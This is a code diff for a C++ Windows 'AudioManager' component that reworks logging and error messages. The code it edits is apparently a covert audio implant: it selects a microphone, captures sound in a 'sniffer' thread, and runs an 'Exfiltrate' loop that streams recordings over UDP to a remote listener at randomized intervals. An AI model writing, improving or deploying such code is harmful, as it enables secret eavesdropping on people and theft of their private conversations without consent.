@@ -1,7 +1,6 @@
 #include "audio.h"
 
 void AudioManager::SetSleepMode(int modeInt) {
-    // 1. Convert the int to our Enum
     SleepProfile profile = static_cast<SleepProfile>(modeInt);
     
     float min = 5.0f;
@@ -54,9 +53,13 @@ std::vector<std::wstring> AudioManager::GetMicrophones() {
             pCollection->Release();
         }
         else {
-            std::cerr << "[-] Failed to initialze local audio enumerator" << std::endl;
+            std::cerr << "[ERROR] failed to enumerate audio enpoints" << std::endl;
         }
         pLocalEnumerator->Release();
+    }
+    else {
+        std::cerr << "[ERROR] failed to initialze local audio enumerator" << std::endl;
+
     }
     return microphones;
 }
@@ -69,17 +72,26 @@ void AudioManager::ListMicrophones() {
     }
 }
 
+void AudioManager::SetIsVerbose(bool mode) {
+    isVerbose = mode;
+}
+
+void AudioManager::LogMessage(const std::string& message) {
+    if (isVerbose) {
+        std::cout << message << std::endl;
+    }
+}
 void AudioManager::SelectMicrophoneFromInt(int micIndex) {
     if (!pEnumerator) {
         (void)CoInitialize(NULL);
         HRESULT hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
         if (FAILED(hr)) {
-            std::cerr << "[-] Failed to create instance of device enumerator" << std::endl;
+            std::cerr << "[ERROR] failed to create instance of device enumerator" << std::endl;
             return;
         }
     }
     else {
-        std::cerr << "[-] pEnumerator is NULL! cant select a microphone" << std::endl;
+        std::cerr << "[ERROR] the local audio enumerator failed to initialze; unable to select a microphone" << std::endl;
     }
 
     IMMDeviceCollection* pCollection = NULL;
@@ -87,22 +99,21 @@ void AudioManager::SelectMicrophoneFromInt(int micIndex) {
 
     if (SUCCEEDED(hr)) {
         IMMDevice* pEndpoint = NULL;
-        // We use micIndex (the argument name) here
         if (SUCCEEDED(pCollection->Item(micIndex - 1, &pEndpoint))) {
             LPWSTR pwszID = NULL;
             if (SUCCEEDED(pEndpoint->GetId(&pwszID))) {
-                this->targetDeviceId = pwszID; // Save to the class member
+                this->targetDeviceId = pwszID; 
                 CoTaskMemFree(pwszID);
             }
             pEndpoint->Release();
         }
         else {
-            std::cerr << "[-] Failed to fetch microphone from index: " << micIndex << " falling back to default microphone" << std::endl;
+            std::cerr << "[ERROR] failed to fetch microphone from index: " << micIndex << " falling back to default microphone" << std::endl;
         }
         pCollection->Release();
     }
     else {
-        std::cerr << "[-] Failed to initialze local audio enumerator" << std::endl;
+        std::cerr << "[ERROR] failed to initialze local audio enumerator" << std::endl;
     }
 }
 
@@ -112,10 +123,7 @@ void AudioManager::RandomSleep() {
     auto t0 = std::chrono::steady_clock::now();
     std::this_thread::sleep_for(std::chrono::duration<float>(value));
     auto t1 = std::chrono::steady_clock::now();
-
-    std::chrono::duration<double> elapsed = t1 - t0;
-    std::cout << "[sleep] requested=" << value
-        << "s actual=" << elapsed.count() << "s\n";
+    LogMessage("[INFO] sleeping for " + std::to_string(value) + " seconds");
 }
 
 void AudioManager::SetListener(std::string ip_address, int port) {
@@ -127,7 +135,7 @@ void AudioManager::SetListener(std::string ip_address, int port) {
     udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (udpSocket == INVALID_SOCKET) {
         WSACleanup();
-        std::cerr << "[-] Failed to create socket object!" << std::endl;
+        std::cerr << "[ERROR] failed to create socket object" << std::endl;
         return;
     }
 
@@ -137,7 +145,7 @@ void AudioManager::SetListener(std::string ip_address, int port) {
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(static_cast<u_short>(port));
     if (inet_pton(AF_INET, ip_address.c_str(), &serverAddr.sin_addr) != 1) {
-        std::cerr << "[-] Bad IP: " << ip_address << "\n";
+        std::cerr << "[ERROR] bad IP address provided: " << ip_address << "\n";
         return;
     }
     socketInitialized = true;
@@ -152,20 +160,20 @@ bool AudioManager::Initialize() {
 
     if (targetDeviceId.empty()) {
         if (FAILED(pEnumerator->GetDefaultAudioEndpoint(eCapture, eConsole, &pDevice))) {
-            std::cerr << "[-] Failed to grab default audio device." << std::endl;
+            std::cerr << "[ERROR] failed to grab default audio device." << std::endl;
             return false;
         }
     }
     else {
         if (FAILED(pEnumerator->GetDevice(targetDeviceId.c_str(), &pDevice))) {
-            std::cerr << "[-] Failed to fetch device from the string: '" << targetDeviceId.c_str() << "'" << std::endl;
+            std::cerr << "[ERROR] failed to fetch device from the string: '" << targetDeviceId.c_str() << "'" << std::endl;
             return false;
         }
     }
 
     hr = pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
     if (FAILED(hr)) {
-        std::cerr << "[-] Failed to activate audio device!" << std::endl;
+        std::cerr << "[ERROR] failed to activate audio device!" << std::endl;
         return false;
     }
 
@@ -196,7 +204,7 @@ bool AudioManager::Initialize() {
         // If 16kHz fails, fall back to the system mix format
         pAudioClient->GetMixFormat(&pwfx);
         hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, 0, 10000000, 0, pwfx, NULL);
-        std::cerr << "[-] Failed to use 16Hz falling back to system default..." << std::endl;
+        std::cerr << "[ERROR] failed to use 16Hz falling back to system default..." << std::endl;
     }
     else {
         if (pwfx) CoTaskMemFree(pwfx); // Clean up old memory if it exists
@@ -205,7 +213,7 @@ bool AudioManager::Initialize() {
             memcpy(pwfx, &targetFormat, sizeof(WAVEFORMATEX));
         }
         else {
-            std::cerr << "[-] Failed to initialize audio mix format" << std::endl;
+            std::cerr << "[ERROR] failed to initialize audio mix format" << std::endl;
         }
     }
 
@@ -228,7 +236,7 @@ void AudioManager::LaunchSnifferThread() {
 
 void AudioManager::AudioSniffer() {
     pAudioClient->Start();
-
+    LogMessage("[INFO] started audio sniffer");
     while (bRunning) {
         UINT32 packetLength = 0;
         pCaptureClient->GetNextPacketSize(&packetLength);
@@ -275,6 +283,7 @@ void AudioManager::Exfiltrate() {
     using clock = std::chrono::steady_clock;
     auto nextFlush = clock::now();
     const auto flushEvery = std::chrono::seconds(5);
+    LogMessage("[INFO] started exfiltration loop");
     while (bRunning) {
         RandomSleep();
 
@@ -314,8 +323,8 @@ void AudioManager::Exfiltrate() {
 
                 if (result == SOCKET_ERROR) {
                     int err = WSAGetLastError();
-                    if (err != 10054) { // Ignore connection reset by peer
-                        std::cerr << "[!] Socket Error: " << err << "\n";
+                    if (err != 10054) {
+                        std::cerr << "[ERROR] socket error: " << err << "\n";
                         break;
                     }
                 }
@@ -332,8 +341,11 @@ void AudioManager::Exfiltrate() {
                 }
             }
 
-            std::cout << "[+] Exfiltrated " << totalSize / 1024 << " KB across "
-                << (totalSize / packetSize) + 1 << " packets.\n";
+            std::string message =
+                "[INFO] exfiltrated " + std::to_string(totalSize / 1024) +
+                " KB across " + std::to_string(totalSize / packetSize + 1) +
+                " packets";
+            LogMessage(message);
         }
 
         nextFlush = clock::now() + flushEvery;
@@ -341,6 +353,7 @@ void AudioManager::Exfiltrate() {
 }
 
 void AudioManager::Stop() {
+    LogMessage("[INFO] stopping");
     bRunning = false;
     if (sniffer.joinable()) sniffer.join();
     if (exfilThread.joinable()) exfilThread.join();
@@ -348,12 +361,13 @@ void AudioManager::Stop() {
 }
 
 void AudioManager::Start() {
+
     if (!bRunning) {
         bRunning = true;
     }
 
     if (!socketInitialized) {
-        std::cerr << "[-] Failed to connect to listener!" << std::endl;
+        std::cerr << "[ERROR] failed to connect to listener" << std::endl;
         return;
     }
     
